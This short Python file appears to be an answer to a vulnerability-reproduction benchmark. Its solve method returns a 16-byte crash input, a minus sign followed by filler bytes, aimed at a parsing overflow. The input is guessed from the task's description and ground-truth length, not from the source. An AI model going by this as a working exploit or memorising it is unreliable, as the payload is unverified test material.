import os
import tempfile
import subprocess

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Based on vulnerability description:
        # - Leading minus sign causes parsing to advance
        # - Not an infinity value
        # - Ground-truth length is 16 bytes
        # We'll create a string with minus sign followed by enough chars to overflow
        # but not "inf" or "infinity"
        
        # Use 16 bytes as specified in ground-truth
        # Format: -[not 'i' or 'I'] followed by filler
        # This ensures it's not recognized as infinity but parsing still advances
        poc = b"-X" + b"A" * 14  # 1 + 1 + 14 = 16 bytes
        
        return poc